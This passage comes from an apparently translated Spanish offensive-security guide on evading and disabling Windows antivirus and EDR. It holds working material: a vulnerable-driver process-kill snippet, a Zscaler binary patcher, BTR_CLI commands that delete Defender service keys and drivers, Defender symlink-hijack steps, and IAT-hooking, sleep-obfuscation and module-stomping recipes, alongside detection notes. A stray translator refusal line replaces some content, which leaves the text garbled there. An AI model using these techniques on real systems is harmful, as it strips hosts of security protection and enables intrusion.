       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Por qué funciona**: BYOVD omite por completo las protecciones de user-mode; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel, independientemente de PPL/PP, ELAM u otras funciones de hardening.

Detección / Mitigación
•  Habilita la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.
•  Supervisa la creación de nuevos servicios de *kernel* y genera alertas cuando se carga un driver desde un directorio con permisos de escritura para todos o que no está en la lista de permitidos.
•  Vigila los handles de user-mode a objetos de dispositivo personalizados, seguidos de llamadas sospechosas a `DeviceIoControl`.

### Omisión de las comprobaciones de postura de Zscaler Client Connector mediante el parcheo de binarios en disco

**Client Connector** de Zscaler aplica reglas de postura del dispositivo localmente y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño deficientes hacen posible una omisión completa:

1. La evaluación de la postura ocurre **enteramente en el cliente** (se envía un booleano al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (mediante `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Al **parchear cuatro binarios firmados en disco**, ambos mecanismos pueden neutralizarse:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que todas las comprobaciones se consideran conformes |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | Se reemplaza por NOP ⇒ cualquier proceso (incluso sin firmar) puede conectarse a las tuberías RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Se reemplaza por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad del túnel | Se omiten mediante un salto |

Fragmento mínimo del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las comprobaciones de postura aparecen **en verde/conformes**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named pipe (p. ej., `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso irrestricto a la red interna definida por las políticas de Zscaler.

Este caso práctico demuestra cómo unas pocas modificaciones de bytes pueden derrotar decisiones de confianza puramente del lado del cliente y simples comprobaciones de firmas.

## Abuso de funcionalidad de confianza de Microsoft Defender `BTR.sys`

El controlador **Boot-Time Removal** de Defender es un contraejemplo útil al BYOVD clásico. `BTR.sys` es un componente de remediación legítimo firmado por Microsoft, sin errores de corrupción de memoria ni una interfaz IOCTL; en cambio, después de obtener acceso de administrador y `SeLoadDriverPrivilege`, un operador puede falsificar su transacción de remediación privada y obtener las operaciones previstas de archivos y registro en Ring-0. Esto es una **primitiva de neutralización de AV/EDR posterior al compromiso, no de acceso inicial ni de escalada de privilegios**, y el controlador se puede extraer del recurso `BOOTTIMETOOL` de `MpEngine.dll` del propio objetivo, en lugar de importar un controlador de terceros llamativo.<sup>[[36]](#references)</sup>

### Preparar el controlador de una sola ejecución

Normalmente, Defender deposita el recurso como un archivo aleatorio `[a-z]{8}.sys` y registra un servicio del kernel con un nombre similar. `DriverEntry` lee el valor `Args` del servicio, abre el ADS de NTFS referenciado, descifra y valida la lista de acciones, escribe comentarios y devuelve `0xC0000056` (`STATUS_DELETE_PENDING`) después de ejecutarse correctamente, para que el controlador se descargue en lugar de permanecer residente. Un servicio falsificado tiene los siguientes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

El stream `:changelist` contiene un blob cifrado con RC4. Las compilaciones analizadas reutilizan una clave fija de 256 bytes, por lo que el cifrado no constituye un límite de autorización. Un texto plano válido tiene un encabezado global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC del encabezado y un ID de transacción derivado del payload), seguido de una ruta de feedback UTF-16 terminada en nulo y cualquier cantidad de elementos. Cada elemento tiene un encabezado de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), además de datos específicos de la acción que terminan en **exactamente cuatro bytes NUL**. Cada región de encabezado/datos se comprueba de forma independiente con el polinomio CRC-32 `0xEDB88320`, estado inicial `0xFFFFFFFF` y **sin XOR final** (`~CRC32`); el estado del CRC se restablece para cada región.<sup>[[36]](#references)[[37]](#references)</sup>

Los ID de acción aceptados exponen estas primitivas del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Datos del elemento | Resultado |
| --- | --- | --- |
| 1 | `[ruta UTF-16]` | Eliminar un archivo, incluso si está bloqueado |
| 2 | `[ruta UTF-16]` | Eliminar un directorio vacío |
| 3 | `[Flags][origen][destino]` | Mover un archivo a una ruta protegida elegida por el atacante; un destino vacío significa eliminar |
| 4 | `[Flags][ruta de clave]` | Eliminar recursivamente una clave del registro |
| 5 | `[Flags][ruta de clave + "\\" + valor]` | Eliminar un valor del registro |
| 6 | `[Flags][tipo][tamaño][ruta de clave + "\\" + valor][datos]` | Crear/actualizar un valor del registro y crear las rutas de clave que falten |

En las acciones 5 y 6, el separador clave/valor en el formato transmitido son **dos barras invertidas consecutivas**; una ruta con el formato convencional no se dividirá correctamente. El archivo de feedback refleja en gran medida la solicitud, pero los primeros cuatro bytes de datos de cada elemento pasan a ser su `NTSTATUS` resultante. En las acciones 1 y 2, que no tienen un campo de flags inicial, BTR desplaza la ruta a los cuatro bytes reservados finales para dejar espacio para ese estado.<sup>[[36]](#references)</sup>

### Flujo de trabajo de `BTR_CLI` y ventana de arranque temprano

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa la cadena completa: extrae `BTR.sys` del Defender local, crea `<random>.sys:changelist` y un stream de feedback, serializa/calcúla las sumas de comprobación/cifra acciones encadenadas, crea directamente la clave del registro del servicio y luego llama a `NtLoadDriver` para `-trigger now` o lo deja como controlador de inicio del sistema para `-trigger boot`. La preparación directa del registro evita la ruta normal de SCM `CreateServiceW` y, por tanto, **no** genera el evento de instalación de servicio ID 7045. Los artefactos activados durante el arranque se pueden eliminar más adelante con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` no es viable porque BTR realiza operaciones de E/S de archivos desde `DriverEntry`, antes de que la pila de almacenamiento y el enlace `SystemRoot` estén listos. `Start=1` junto con el grupo de alta prioridad `Boot Bus Extender` hace que se ejecute en la Fase 1: NTFS está disponible, pero muchos controladores de seguridad de inicio del sistema y servicios EDR en modo usuario aún no se han inicializado. Es posible que los filtros de inicio, como `WdFilter`, ya estén cargados; sin embargo, BTR puede eliminar sus binarios o la configuración de sus servicios antes del siguiente inicio, y puede borrar los ejecutables de los servicios antes de que SCM los inicie. ELAM no cierra esta brecha porque BTR se ejecuta después de la evaluación de inicio y tiene una firma válida de Microsoft.<sup>[[36]](#references)</sup>

Varias acciones se ejecutan en una sola transacción. La PoC antepone la Acción 1 para la ruta codificada `\SystemRoot\Temp\BootClean.log`: BTR crea este registro, luego procesa su propia solicitud de eliminación y lo borra antes de descargarse. Esto reduce las evidencias, mientras que guardar el feedback en `<random>.sys:<random>.dat` permite eliminar conjuntamente el controlador y ambos flujos.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlaciones de detección de alta señal

Las reglas basadas únicamente en firmas y la lista de bloqueo de controladores vulnerables de Microsoft no abordan el abuso de la funcionalidad prevista de BTR. Es preferible usar estas correlaciones de comportamiento, distinguiendo el linaje legítimo de Defender de un iniciador arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creación de `.sys:changelist` es universal en la preparación de BTR. Un ADS `.dat` asociado al mismo `.sys` es especialmente sospechoso, porque Defender normalmente guarda el feedback en `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sin System 7045:** correlaciona la creación directa de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` que contiene `Args=...:changelist` y `Group=Boot Bus Extender`, sin un evento de instalación correspondiente de SCM.
- **Sysmon 6 -> 23:** correlaciona la carga de un controlador BTR conocido cuyo linaje no sea de Defender con la posterior eliminación de archivos atribuida a `System`/PID 4, especialmente si se trata de binarios de seguridad.
- **Sysmon 11 -> 23:** genera una alerta ante la creación y eliminación rápida de `\SystemRoot\Temp\BootClean.log` por parte de `System`/PID 4.
- Restringe y audita la asignación y habilitación de `SeLoadDriverPrivilege`; una firma de Microsoft por sí sola no basta para confiar en un controlador de una herramienta de seguridad preparado por `cmd.exe`, PowerShell o un proceso desconocido.

## Abusar de Protected Process Light (PPL) para manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmante/nivel, de modo que solo los procesos protegidos con un nivel igual o superior pueden manipularse entre sí. Desde una perspectiva ofensiva, si puedes iniciar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir una funcionalidad benigna (por ejemplo, el registro) en una primitiva de escritura acotada y respaldada por PPL contra directorios protegidos usados por AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Qué hace que un proceso se ejecute como PPL
- El EXE de destino (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un nivel de protección compatible que coincida con el firmante del binario (por ejemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes antimalware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Los niveles incorrectos harán que la creación falle.

Consulta también aquí una introducción más amplia a PP/PPL y la protección de LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Herramientas de lanzamiento
- Herramienta auxiliar de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y pasa los argumentos al EXE de destino):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Patrón de uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

No puedo traducir instrucciones para evadir o inutilizar software antivirus. Puedo ayudar a convertirlo en una descripción defensiva de alto nivel para documentación de seguridad.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas y restricciones
- No puedes controlar el contenido que escribe ClipUp, solo dónde lo coloca; esta primitiva sirve para corromper archivos, no para inyectar contenido preciso.
- Se requieren privilegios de administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- La sincronización es crítica: el objetivo no debe estar abierto; la ejecución durante el arranque evita bloqueos de archivos.

Detecciones
- Creación del proceso `ClipUp.exe` con argumentos inusuales, especialmente si lo inicia un proceso principal no estándar, durante el arranque.
- Servicios nuevos configurados para iniciar automáticamente archivos binarios sospechosos y que se inician sistemáticamente antes que Defender/AV. Investiga la creación/modificación de servicios antes de los errores de inicio de Defender.
- Supervisión de integridad de archivos de los archivos binarios/directorios Platform de Defender; creaciones/modificaciones inesperadas de archivos por procesos con indicadores de proceso protegido.
- Telemetría ETW/EDR: busca procesos creados con `CREATE_PROTECTED_PROCESS` y un uso anómalo del nivel PPL por archivos binarios que no sean de AV.

Mitigaciones
- WDAC/Code Integrity: restringe qué archivos binarios firmados pueden ejecutarse como PPL y bajo qué procesos principales; bloquea la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringe la creación/modificación de servicios de inicio automático y supervisa la manipulación del orden de inicio.
- Asegúrate de que la protección contra alteraciones de Defender y las protecciones de inicio temprano estén habilitadas; investiga los errores de inicio que indiquen corrupción de archivos binarios.
- Considera deshabilitar la generación de nombres cortos 8.3 en los volúmenes que alojan herramientas de seguridad, si es compatible con tu entorno (pruébalo exhaustivamente).

## Alteración de Microsoft Defender mediante secuestro de symlink de la carpeta de versiones de Platform

Windows Defender elige desde qué plataforma ejecutarse enumerando las subcarpetas de:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (por ejemplo, `4.18.25070.5-0`) y, a continuación, inicia desde allí los procesos del servicio Defender (actualizando las rutas del servicio/registro según corresponda). Esta selección confía en las entradas de directorio, incluidos los puntos de análisis de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta en la que el atacante pueda escribir y lograr DLL sideloading o interrumpir el servicio.<sup>[[21]](#references)[[22]](#references)</sup>

Requisitos previos
- Administrador local (necesario para crear directorios/symlinks en la carpeta Platform)
- Capacidad para reiniciar o activar una nueva selección de plataforma de Defender (reinicio del servicio durante el arranque)
- Solo se requieren herramientas integradas (mklink)

Por qué funciona
- Defender bloquea las escrituras en sus propias carpetas, pero la selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino se resuelva a una ruta protegida/de confianza.

Paso a paso (ejemplo)
1) Prepara un clon en una ubicación donde se pueda escribir de la carpeta de plataforma actual, por ejemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un enlace simbólico de directorio de versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del trigger (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifica que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso en `C:\TMP\AV\` y la configuración del servicio/el registro reflejando esa ubicación.

Opciones de post-explotación
- DLL sideloading/ejecución de código: coloca/reemplaza DLL que Defender carga desde su directorio de aplicaciones para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Interrupción/denegación del servicio: elimina el enlace simbólico de la versión para que, en el siguiente inicio, la ruta configurada no se resuelva y Defender no pueda iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalada de privilegios por sí sola; requiere derechos de administrador.

## API/IAT Hooking + Call-Stack Spoofing con PIC (estilo Crystal Kit)

Los equipos red pueden trasladar la evasión en tiempo de ejecución desde el implante C2 al propio módulo objetivo, enganchando su Import Address Table (IAT) y dirigiendo las API seleccionadas a código independiente de posición (PIC) controlado por el atacante. Esto generaliza la evasión más allá de la pequeña superficie de API que exponen muchos kits (p. ej., CreateProcessA) y extiende las mismas protecciones a BOFs y DLL de post-explotación.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Enfoque de alto nivel
- Prepara un blob PIC junto al módulo objetivo mediante un cargador reflectivo (antepuesto o complementario). El PIC debe ser autocontenido e independiente de posición.
- Cuando se carga la DLL anfitriona, recorre su IMAGE_IMPORT_DESCRIPTOR y modifica las entradas de la IAT de las importaciones objetivo (p. ej., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a wrappers PIC ligeros.
- Cada wrapper PIC ejecuta evasiones antes de llamar en cola a la dirección de la API real. Las evasiones habituales incluyen:
  - Enmascarar/desenmascarar la memoria alrededor de la llamada (p. ej., cifrar regiones de beacon, RWX→RX, cambiar nombres/permisos de páginas) y luego restaurarla.
  - Call-stack spoofing: construir una pila benigna y pasar a la API objetivo para que el análisis de la pila de llamadas resuelva los frames esperados.<sup>[[9]](#references)</sup>
- Para garantizar la compatibilidad, exporta una interfaz para que un script de Aggressor (o equivalente) pueda registrar qué API enganchar para Beacon, BOFs y DLL de post-explotación.

Por qué usar IAT hooking aquí
- Funciona con cualquier código que use la importación enganchada, sin modificar el código de la herramienta ni depender de que Beacon intermedie API específicas.
- Cubre DLL de post-explotación: enganchar LoadLibrary* permite interceptar cargas de módulos (p. ej., System.Management.Automation.dll, clr.dll) y aplicar el mismo enmascaramiento y la misma evasión de pila a sus llamadas a API.
- Restaura el uso fiable de comandos de post-explotación que crean procesos frente a detecciones basadas en la pila de llamadas, mediante el wrapping de CreateProcessA/W.

Esquema mínimo de IAT hooking (pseudocódigo C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el parche después de las relocaciones/ASLR y antes del primer uso de la importación. Los loaders reflectivos como TitanLdr/AceLdr demuestran el hooking durante el DllMain del módulo cargado.
- Mantén los wrappers pequeños y seguros para PIC; resuelve la API real mediante el valor original de IAT que capturaste antes del parche o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas con permisos de escritura y ejecución.

Stub de spoofing de call stack
- Los stubs PIC de estilo Draugr construyen una cadena de llamadas falsa (con direcciones de retorno dentro de módulos benignos) y luego redirigen la ejecución a la API real.
- Esto evade las detecciones que esperan stacks canónicos de Beacon/BOFs para las API sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para llegar a los frames esperados antes del prólogo de la API.

Integración operativa
- Antepon el loader reflectivo a las DLL post-ex para que el PIC y los hooks se inicialicen automáticamente al cargar la DLL.
- Usa un script Aggressor para registrar las API objetivo, de modo que Beacon y BOFs se beneficien de forma transparente de la misma ruta de evasión sin modificar el código.

Consideraciones de detección/DFIR
- Integridad de IAT: entradas que resuelven a direcciones no pertenecientes a una imagen (heap/anónimas); verificación periódica de los punteros de importación.
- Anomalías en el stack: direcciones de retorno que no pertenecen a imágenes cargadas; transiciones abruptas a PIC no perteneciente a una imagen; ascendencia de RtlUserThreadStart incoherente.
- Telemetría del loader: escrituras en la IAT dentro del proceso, actividad temprana de DllMain que modifica los thunks de importación, regiones RX inesperadas creadas durante la carga.
- Evasión de carga de imágenes: si interceptas LoadLibrary*, supervisa las cargas sospechosas de ensamblados de automation/clr correlacionadas con eventos de enmascaramiento de memoria.

Componentes y ejemplos relacionados
- Loaders reflectivos que realizan parcheo de IAT durante la carga (p. ej., TitanLdr, AceLdr)
- Hooks de enmascaramiento de memoria (p. ej., simplehook) y PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de call stack (p. ej., Draugr)


## Hooking de IAT en tiempo de importación + ofuscación de sleep (Crystal Palace/PICO)

### Hooks de IAT en tiempo de importación mediante un PICO residente

Si controlas un loader reflectivo, puedes interceptar las importaciones **durante** `ProcessImports()` reemplazando el puntero `GetProcAddress` del loader por un resolver personalizado que compruebe primero los hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (objeto PIC persistente) que sobreviva después de que el PIC transitorio del loader se libere.
- Exporta una función `setup_hooks()` que sobrescriba el resolver de importaciones del loader (p. ej., `funcs.GetProcAddress = _GetProcAddress`).
- En `_GetProcAddress`, omite las importaciones por ordinal y usa una búsqueda de hooks basada en hash como `__resolve_hook(ror13hash(name))`. Si existe un hook, devuélvelo; de lo contrario, delega en el `GetProcAddress` real.
- Registra los objetivos de los hooks al enlazar con entradas `addhook "MODULE$Func" "hook"` de Crystal Palace. El hook sigue siendo válido porque está dentro del PICO residente.

Esto permite la **redirección de IAT en tiempo de importación** sin parchear la sección de código de la DLL cargada después de su carga.

### Forzar importaciones interceptables cuando el objetivo recorre el PEB

Los hooks de importación en tiempo de carga solo se activan si la función realmente está en la IAT del objetivo. Si un módulo resuelve API mediante un recorrido del PEB + hash (sin una entrada de importación), fuerza una importación real para que el loader la procese mediante `ProcessImports()`:

- Reemplaza la resolución de exportaciones mediante hash (p. ej., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por una referencia directa como `&WaitForSingleObject`.
- El compilador genera una entrada de IAT, lo que permite interceptarla cuando el loader reflectivo resuelve las importaciones.

### Ofuscación de sleep/idle de estilo Ekko sin parchear `Sleep()`

En lugar de parchear `Sleep`, intercepta las **primitivas reales de espera/IPC** que usa el implante (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas prolongadas, envuelve la llamada en una cadena de ofuscación de estilo Ekko que cifra la imagen en memoria durante el periodo inactivo:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` para programar una secuencia de callbacks que llamen a `NtContinue` con frames `CONTEXT` preparados.
- Cadena habitual (x64): cambia la imagen a `PAGE_READWRITE` → cifra con RC4 mediante `advapi32!SystemFunction032` toda la imagen mapeada → realiza la espera bloqueante → descifra con RC4 → **restaura los permisos de cada sección** recorriendo las secciones PE → señala la finalización.
- `RtlCaptureContext` proporciona una plantilla `CONTEXT`; clónala en varios frames y configura los registros (`Rip/Rcx/Rdx/R8/R9`) para invocar cada paso.

Detalle operativo: devuelve “success” para las esperas prolongadas (p. ej., `WAIT_OBJECT_0`) para que el llamador continúe mientras la imagen está enmascarada. Este patrón oculta el módulo a los scanners durante los periodos inactivos y evita la firma clásica de `Sleep()` parcheado.

Ideas de detección (basadas en telemetría)
- Ráfagas de callbacks de `CreateTimerQueueTimer` que apuntan a `NtContinue`.
- Uso de `advapi32!SystemFunction032` en búferes contiguos grandes, del tamaño de una imagen.
- Llamadas a `VirtualProtect` sobre rangos grandes, seguidas de una restauración personalizada de permisos por sección.

### Registro de CFG en tiempo de ejecución para gadgets de ofuscación de sleep

En objetivos con CFG habilitado, el primer salto indirecto a un gadget en mitad de una función, como `jmp [rbx]` o `jmp rdi`, normalmente bloqueará el proceso con `STATUS_STACK_BUFFER_OVERRUN` porque el gadget no está presente en los metadatos CFG del módulo. Para mantener activas las cadenas de estilo Ekko/Kraken en procesos reforzados:<sup>[[30]](#references)</sup>

- Registra todos los destinos indirectos de la cadena mediante `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` y entradas `CFG_CALL_TARGET_VALID`.
- Para direcciones dentro de imágenes cargadas (`ntdll`, `kernel32`, `advapi32`), el `MEMORY_RANGE_ENTRY` debe empezar en la **base de la imagen** y abarcar el **tamaño completo de la imagen**.
- Para regiones mapeadas manualmente/PIC/stomped, usa en su lugar la **base de asignación** y el tamaño de la asignación.
- Marca no solo el gadget de dispatch, sino también las exportaciones a las que se llega indirectamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, llamadas al sistema de espera/eventos) y cualquier sección ejecutable controlada por el atacante que se convierta en destino indirecto.

Esto convierte las cadenas de sleep de estilo ROP/JOP, que “solo funcionan en procesos sin CFG”, en una primitiva reutilizable para `explorer.exe`, navegadores, `svchost.exe` y otros endpoints compilados con `/guard:cf`.

### Spoofing de stack compatible con CET para threads en espera

La sustitución completa de `CONTEXT` genera ruido y puede fallar en sistemas con CET Shadow Stack, porque un `Rip` falsificado debe coincidir con el shadow stack del hardware. Un patrón más seguro para enmascarar durante el sleep es:<sup>[[30]](#references)</sup>

- Elige otro thread del mismo proceso y lee los límites del stack de su `NT_TIB` / TEB (`StackBase`, `StackLimit`) mediante `NtQueryInformationThread`.
- Haz una copia de respaldo del TEB/TIB real del thread actual.
- Captura el contexto real del thread en espera con `GetThreadContext`.
- Copia **solo** el `Rip` real al contexto falsificado, dejando intacto el `Rsp`/estado del stack falsificado.
- Durante el periodo de sleep, copia el `NT_TIB` del thread falsificado al TEB actual para que los stack walkers recorran un rango de stack legítimo.
- Cuando termine la espera, restaura el TIB y el contexto del thread originales.

Esto mantiene un puntero de instrucción compatible con CET y engaña a los stack walkers de EDR que confían en los metadatos del stack del TEB para validar los unwinds.

### Alternativa basada en APC: Kraken Mask

Si el dispatch de la cola de timers está demasiado asociado a una firma, la misma secuencia de sleep-cifrado-spoofing-restauración puede ejecutarse desde un thread auxiliar suspendido mediante APC encoladas:<sup>[[27]](#references)</sup>

- Crea un thread auxiliar con `NtTestAlert` como punto de entrada.
- Encola frames `CONTEXT`/APC preparados con `NtQueueApcThread` y ejecútalos con `NtAlertResumeThread`.
- Guarda el estado de la cadena en el heap en lugar de en el stack auxiliar para evitar agotar el stack predeterminado de 64 KB del thread.
- Usa `NtSignalAndWaitForSingleObject` para señalar el evento de inicio y bloquear de forma atómica.
- Suspende el thread principal antes de restaurar el TIB/contexto (`NtSuspendThread` → restaurar → `NtResumeThread`) para reducir el periodo en que un scanner podría detectar un stack parcialmente restaurado.

Esto sustituye la firma `CreateTimerQueueTimer` + `NtContinue` por una firma de thread auxiliar/APC, manteniendo los mismos objetivos de enmascaramiento RC4 y spoofing de stack.

Ideas adicionales de detección
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco antes de sleeps, esperas o dispatch de APC.
- `GetThreadContext`/`SetThreadContext` alrededor de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de escrituras directas en los límites del stack del TEB/TIB del thread actual.
- Cadenas `NtQueueApcThread`/`NtAlertResumeThread` que llegan indirectamente a `SystemFunction032`, `VirtualProtect` o helpers de restauración de permisos de secciones.
- Uso repetido de firmas cortas de gadgets como `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) como pivotes de dispatch dentro de módulos firmados.


## Precision Module Stomping

Module stomping ejecuta payloads desde la **sección `.text` de una DLL ya mapeada dentro del proceso objetivo**, en lugar de asignar memoria ejecutable privada evidente o cargar una DLL sacrificable nueva. El objetivo de sobrescritura debe ser una **imagen cargada y respaldada por disco** cuyo espacio de código pueda alojar el payload sin corromper rutas de código que el proceso aún necesita.<sup>[[1]](#references)[[2]](#references)</sup>

### Selección fiable del objetivo

El stomping ingenuo de módulos comunes como `uxtheme.dll` o `comctl32.dll` es poco fiable: la DLL podría no estar cargada en el proceso remoto y una región de código demasiado pequeña provocará que el proceso se bloquee. Un flujo de trabajo más fiable es:

1. Enumera los módulos del proceso objetivo y conserva una lista de inclusión **solo con nombres** de las DLL ya cargadas.
2. Compila primero el payload y registra su **tamaño exacto en bytes**.
3. Busca DLL candidatas en disco y compara `.text` **`Misc_VirtualSize`** de la sección PE con el tamaño del payload. Esto importa más que el tamaño del archivo porque refleja el tamaño de la sección ejecutable **cuando se mapea en memoria**.
4. Analiza la **Export Address Table (EAT)** y elige el RVA de una función exportada como offset inicial para el stomp.
5. Calcula el **radio de impacto**: si el payload supera el límite de la función seleccionada, sobrescribirá las exportaciones adyacentes ubicadas después de ella en memoria.

Helpers habituales de reconocimiento/selección observados en la práctica:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notas operativas
- Preferir DLLs **ya cargadas** en el proceso remoto para evitar la telemetría de `LoadLibrary`/cargas inesperadas de imágenes.
- Preferir exports que la aplicación objetivo ejecute rara vez; de lo contrario, las rutas de código normales podrían alcanzar los bytes sobrescritos antes o después de crear el hilo.
- Los implants grandes suelen requerir cambiar la inserción del shellcode de un literal de cadena a un **inicializador de matriz de bytes/con llaves** para que el buffer completo se represente correctamente en el código fuente del injector.

Ideas de detección
- Escrituras remotas en páginas ejecutables respaldadas por imágenes (`MEM_IMAGE`, `PAGE_EXECUTE*`), en lugar de las asignaciones privadas RWX/RX más habituales.
- Puntos de entrada de exports cuyos bytes en memoria ya no coinciden con el archivo de respaldo en disco.
- Hilos remotos o cambios de contexto que comienzan la ejecución dentro de un export de una DLL legítima cuyos primeros bytes se modificaron recientemente.
- Secuencias sospechosas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL, seguidas de la creación de un hilo.

## Process Parameter Poisoning (P3)

